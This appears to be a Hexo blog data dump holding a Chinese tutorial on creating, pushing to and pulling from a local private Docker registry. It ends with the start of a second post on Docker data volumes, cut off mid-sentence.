class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>在实际的生产条件中，公司会用到涉及公司内部的资料，并不希望将镜像挂在公共的仓库，那就需要一个私有的容器仓库来存放打包的镜像，本节记录如何创建本地私有镜像仓库，并上传下载镜像。</p>\n<ol>\n<li>拉取镜像</li>\n</ol>\n<p>执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull registry</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>运行容器</li>\n</ol>\n<p>下载完镜像之后同样需要先把镜像运行起来，执行下面的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=<span class=\"literal\">true</span> --name registry-1 registry</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-d 守护进程运行（后台运行）</p>\n</li>\n<li><p>-v 数据卷映射，把本地的<code>/docker/registry/</code>映射为容器的<code>/tmp/registry</code>。</p>\n</li>\n<li><p>–privileged&#x3D;true，container内的root拥有真正的root权限。具体解释参考<a href=\"https://blog.csdn.net/wangxuelei036/article/details/107457712\">这篇文章</a>。</p>\n</li>\n<li><p>–name 指定容器的名字，不设置会由系统随机分配一个。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li>测试仓库可用性</li>\n</ol>\n<p>当前我电脑的IP为：192.168.1.42。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -XGET http://192.168.1.42:5000/v2/_catalog</span><br></pre></td></tr></table></figure>\n\n<p>下面的例子可以看到当前本地私有仓库中并没有任何的镜像，出现<code>&#123;&quot;repositories&quot;:[]&#125;</code>,表示本地私有仓库可用。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># curl -XGET http://192.168.1.42:5000/v2/_catalog</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;repositories&quot;</span>:[]&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>生成镜像</li>\n</ol>\n<p>更新一个镜像，并重新commit生成一个镜像，具体生成镜像的方法可以参考<a href=\"https://nustarain.gitee.io/2023/08/09/ContainerCommit/\">这篇文章</a></p>\n<p>比如，我利用mynginx:1.0重新生成了版本号为1.1的mynginx镜像：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker commit -m &quot;add net-tools package&quot; -a &quot;lxp&quot; nginx-1 mynginx:1.1</span></span><br><span class=\"line\">sha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY       TAG       IMAGE ID       CREATED          SIZE</span><br><span class=\"line\">mynginx          1.1       f35ce030ad11   11 seconds ago   198MB</span><br><span class=\"line\">mynginx          1.0       ff65638c821e   5 hours ago      196MB</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>更改镜像名称</li>\n</ol>\n<p>上传到本地私有仓库需要满足一定的镜像名称上传规范，需要对mynginx:1.1进行改名：</p>\n<p>当前我电脑的IP为：192.168.1.42。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 </span></span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY                  TAG       IMAGE ID       CREATED          SIZE</span><br><span class=\"line\">192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB</span><br><span class=\"line\">mynginx                     1.1       f35ce030ad11   13 minutes ago   198MB</span><br><span class=\"line\">mynginx                     1.0       ff65638c821e   5 hours ago      196MB</span><br></pre></td></tr></table></figure>\n\n<p>可以看出，修改tag之后，并不是将原来的镜像直接更名，而是克隆出一个更名的镜像。</p>\n<ol start=\"6\">\n<li>修改配置文件</li>\n</ol>\n<p>在docker中默认不支持http协议，所以需要我们手动修改配置文件，以支持http协议。</p>\n<p>例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># cat /etc/docker/daemon.json </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://az7a5oso.mirror.aliyuncs.com&quot;</span>],</span><br><span class=\"line\">  <span class=\"string\">&quot;insecure-registries&quot;</span>: [<span class=\"string\">&quot;192.168.1.42:5000&quot;</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>registry-mirrors 是加速用的。</p>\n</li>\n<li><p>insecure-registries 是开启http协议的。</p>\n</li>\n</ul>\n<p>配置完成后如果不生效，尝试<code>systemctl daemon-reload</code>。</p>\n<p>如果还是不行，尝试<code>systemctl restart docker</code>，实际生产环境中，很少会直接重启docker，因为重启后，所有的容器都会停止，所以这条命令一定要放在最后。</p>\n<p>如果重启了docker，不要忘记步骤2，重新运行容器。</p>\n<ol start=\"7\">\n<li>上传到私有仓库</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker push 192.168.1.42:5000/mynginx:1.1 </span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker push 192.168.1.42:5000/mynginx:1.1 </span></span><br><span class=\"line\">The push refers to repository [192.168.1.42:5000/mynginx]</span><br><span class=\"line\">0033c6e89448: Pushed </span><br><span class=\"line\">d874fd2bc83b: Pushed </span><br><span class=\"line\">32ce5f6a5106: Pushed </span><br><span class=\"line\">f1db227348d0: Pushed </span><br><span class=\"line\">b8d6e692a25e: Pushed </span><br><span class=\"line\">e379e8aedd4d: Pushed </span><br><span class=\"line\">2edcec3590a4: Pushed </span><br><span class=\"line\">1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>验证仓库镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># curl -XGET http://192.168.1.42:5000/v2/_catalog</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;repositories&quot;</span>:[<span class=\"string\">&quot;mynginx&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到现在仓库中已经存在“mynginx”的镜像了。</p>\n<ol start=\"9\">\n<li>PULL到本地使用</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull 192.168.1.42:5000/mynginx:1.1</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY                  TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">mynginx                     1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">nginx                       latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">registry                    latest    b8604a3fe854   21 months ago       26.2MB</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker rmi 192.168.1.42:5000/mynginx:1.1 </span></span><br><span class=\"line\">Untagged: 192.168.1.42:5000/mynginx:1.1</span><br><span class=\"line\">Untagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY   TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">mynginx      1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">nginx        latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">registry     latest    b8604a3fe854   21 months ago       26.2MB</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker pull 192.168.1.42:5000/mynginx:1.1</span></span><br><span class=\"line\">1.1: Pulling from mynginx</span><br><span class=\"line\">Digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4</span><br><span class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> 192.168.1.42:5000/mynginx:1.1</span><br><span class=\"line\">192.168.1.42:5000/mynginx:1.1</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY                  TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">mynginx                     1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">nginx                       latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">registry                    latest    b8604a3fe854   21 months ago       26.2MB</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>在实际的生产条件中，公司会用到涉及公司内部的资料，并不希望将镜像挂在公共的仓库，那就需要一个私有的容器仓库来存放打包的镜像，本节记录如何创建本地私有镜像仓库，并上传下载镜像。</p>\n<ol>\n<li>拉取镜像</li>\n</ol>\n<p>执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull registry</span><br></pre></td></tr></table></figure>","more":"<ol start=\"2\">\n<li>运行容器</li>\n</ol>\n<p>下载完镜像之后同样需要先把镜像运行起来，执行下面的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=<span class=\"literal\">true</span> --name registry-1 registry</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-d 守护进程运行（后台运行）</p>\n</li>\n<li><p>-v 数据卷映射，把本地的<code>/docker/registry/</code>映射为容器的<code>/tmp/registry</code>。</p>\n</li>\n<li><p>–privileged&#x3D;true，container内的root拥有真正的root权限。具体解释参考<a href=\"https://blog.csdn.net/wangxuelei036/article/details/107457712\">这篇文章</a>。</p>\n</li>\n<li><p>–name 指定容器的名字，不设置会由系统随机分配一个。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li>测试仓库可用性</li>\n</ol>\n<p>当前我电脑的IP为：192.168.1.42。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -XGET http://192.168.1.42:5000/v2/_catalog</span><br></pre></td></tr></table></figure>\n\n<p>下面的例子可以看到当前本地私有仓库中并没有任何的镜像，出现<code>&#123;&quot;repositories&quot;:[]&#125;</code>,表示本地私有仓库可用。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># curl -XGET http://192.168.1.42:5000/v2/_catalog</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;repositories&quot;</span>:[]&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>生成镜像</li>\n</ol>\n<p>更新一个镜像，并重新commit生成一个镜像，具体生成镜像的方法可以参考<a href=\"https://nustarain.gitee.io/2023/08/09/ContainerCommit/\">这篇文章</a></p>\n<p>比如，我利用mynginx:1.0重新生成了版本号为1.1的mynginx镜像：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker commit -m &quot;add net-tools package&quot; -a &quot;lxp&quot; nginx-1 mynginx:1.1</span></span><br><span class=\"line\">sha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY       TAG       IMAGE ID       CREATED          SIZE</span><br><span class=\"line\">mynginx          1.1       f35ce030ad11   11 seconds ago   198MB</span><br><span class=\"line\">mynginx          1.0       ff65638c821e   5 hours ago      196MB</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>更改镜像名称</li>\n</ol>\n<p>上传到本地私有仓库需要满足一定的镜像名称上传规范，需要对mynginx:1.1进行改名：</p>\n<p>当前我电脑的IP为：192.168.1.42。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 </span></span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY                  TAG       IMAGE ID       CREATED          SIZE</span><br><span class=\"line\">192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB</span><br><span class=\"line\">mynginx                     1.1       f35ce030ad11   13 minutes ago   198MB</span><br><span class=\"line\">mynginx                     1.0       ff65638c821e   5 hours ago      196MB</span><br></pre></td></tr></table></figure>\n\n<p>可以看出，修改tag之后，并不是将原来的镜像直接更名，而是克隆出一个更名的镜像。</p>\n<ol start=\"6\">\n<li>修改配置文件</li>\n</ol>\n<p>在docker中默认不支持http协议，所以需要我们手动修改配置文件，以支持http协议。</p>\n<p>例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># cat /etc/docker/daemon.json </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://az7a5oso.mirror.aliyuncs.com&quot;</span>],</span><br><span class=\"line\">  <span class=\"string\">&quot;insecure-registries&quot;</span>: [<span class=\"string\">&quot;192.168.1.42:5000&quot;</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>registry-mirrors 是加速用的。</p>\n</li>\n<li><p>insecure-registries 是开启http协议的。</p>\n</li>\n</ul>\n<p>配置完成后如果不生效，尝试<code>systemctl daemon-reload</code>。</p>\n<p>如果还是不行，尝试<code>systemctl restart docker</code>，实际生产环境中，很少会直接重启docker，因为重启后，所有的容器都会停止，所以这条命令一定要放在最后。</p>\n<p>如果重启了docker，不要忘记步骤2，重新运行容器。</p>\n<ol start=\"7\">\n<li>上传到私有仓库</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker push 192.168.1.42:5000/mynginx:1.1 </span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker push 192.168.1.42:5000/mynginx:1.1 </span></span><br><span class=\"line\">The push refers to repository [192.168.1.42:5000/mynginx]</span><br><span class=\"line\">0033c6e89448: Pushed </span><br><span class=\"line\">d874fd2bc83b: Pushed </span><br><span class=\"line\">32ce5f6a5106: Pushed </span><br><span class=\"line\">f1db227348d0: Pushed </span><br><span class=\"line\">b8d6e692a25e: Pushed </span><br><span class=\"line\">e379e8aedd4d: Pushed </span><br><span class=\"line\">2edcec3590a4: Pushed </span><br><span class=\"line\">1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>验证仓库镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># curl -XGET http://192.168.1.42:5000/v2/_catalog</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;repositories&quot;</span>:[<span class=\"string\">&quot;mynginx&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到现在仓库中已经存在“mynginx”的镜像了。</p>\n<ol start=\"9\">\n<li>PULL到本地使用</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull 192.168.1.42:5000/mynginx:1.1</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY                  TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">mynginx                     1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">nginx                       latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">registry                    latest    b8604a3fe854   21 months ago       26.2MB</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker rmi 192.168.1.42:5000/mynginx:1.1 </span></span><br><span class=\"line\">Untagged: 192.168.1.42:5000/mynginx:1.1</span><br><span class=\"line\">Untagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY   TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">mynginx      1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">nginx        latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">registry     latest    b8604a3fe854   21 months ago       26.2MB</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker pull 192.168.1.42:5000/mynginx:1.1</span></span><br><span class=\"line\">1.1: Pulling from mynginx</span><br><span class=\"line\">Digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4</span><br><span class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> 192.168.1.42:5000/mynginx:1.1</span><br><span class=\"line\">192.168.1.42:5000/mynginx:1.1</span><br><span class=\"line\">root@knight:/<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY                  TAG       IMAGE ID       CREATED             SIZE</span><br><span class=\"line\">192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">mynginx                     1.1       f35ce030ad11   About an hour ago   198MB</span><br><span class=\"line\">nginx                       latest    605c77e624dd   19 months ago       141MB</span><br><span class=\"line\">registry                    latest    b8604a3fe854   21 months ago       26.2MB</span><br></pre></td></tr></table></figure>"},{"title":"Docker数据卷详解","date":"2023-08-10T06:39:46.000Z","_content":"\n### 数据卷介绍\n\n容器数据卷(Container Volumes)是Docker用于持久化和共享容器数据的一种机制。它允许您在容器之间共享文件/文件夹,并且对容器生命周期之外的数据进行持久化存储。\n\n主要特点包括:\n\n- 数据共享 - 容器之间可以通过数据卷来共享数据。多个容器可以同时挂载一个数据卷,实现数据共享。\n\n<!-- more -->\n\n- 数据持久化 - 数据卷的生命周期独立于容器,即使容器被删除,数据卷中的数据也不会丢失。\n\n- 数据加密 - 可以对 Docker 数据卷内容进行加密,保证数据安全性。\n\n- 性能优势 - 容器绕过 Union File System,可以直接操作数据卷,提高IO性能。\n\n- 挂载宿主目录 - 可以将宿主机上的目录作为数据卷挂载到容器中,实现容器访问宿主机文件。\n\n使用数据卷的场景包括需要保存容器数据、需要在容器之间共享文件、需要备份、恢复或迁移数据等。总之,容器数据卷为容器提供了持久化存储和数据共享能力。\n\n### 简单使用\n\n```bash\ndocker run -d -p 6603:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7\n```\n\n使用-v选项来对主机目录和容器内的目录进行映射，使用冒号间隔。\n\n映射后，从无论是主机部分新建的文件，还是容器内新建的文件，都可以实时在映射对方实现互通有无。\n\n### 常用命令\n\n1. 删除数据卷\n\n```bash\ndocker volume create my-vol\n```\n\n2. 查看所有的数据卷\n\n```bash\ndocker volume ls\n```\n\n3. 查看指定数据卷的信息\n\n```bash\ndocker volume inspect my-vol\n```\n\n4. 删除数据卷\n\n```bash\ndocker volume rm my-vol\n```\n\n5. 清理无主的数据卷\n\n```bash\ndocker volume prune\n```\n\n6. 使用 --mount创建数据卷\n\n挂载一个主机目录作为数据卷。使用 --mount 标记可以指定挂载一个本地主机的目录到容器中去。\n\n```bash\ndocker run -d --name test \\\n    --mount type=bind,source=/host/path,target=/container/path \\\n    nginx:latest\n```\n\n这个例子中,会将主机路径 /host/path 挂载到容器内的 /container/path,实现在主机和容器之间共享这个目录。\n\n另一个例子:\n\n```bash\ndocker run -d --name test \\\n   --mount type=bind,source=$(pwd)/config.json,target=/app/config.json \\\n   myapp:latest\n```\n\n这将主机当前目录下的 config.json 文件挂载到容器的 /app/config.json。挂载单个文件作为数据卷,提供一种配置注入的方式。\n\n总之,--mount 参数提供了一个在 docker run 时直接挂载主机目录的简便方法,避免了使用额外的 docker volume 命令。\n\n### 具名挂载和匿名挂载\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)是Docker中的两种数据卷方式。\n\n具名挂载:\n\n需要通过docker volume 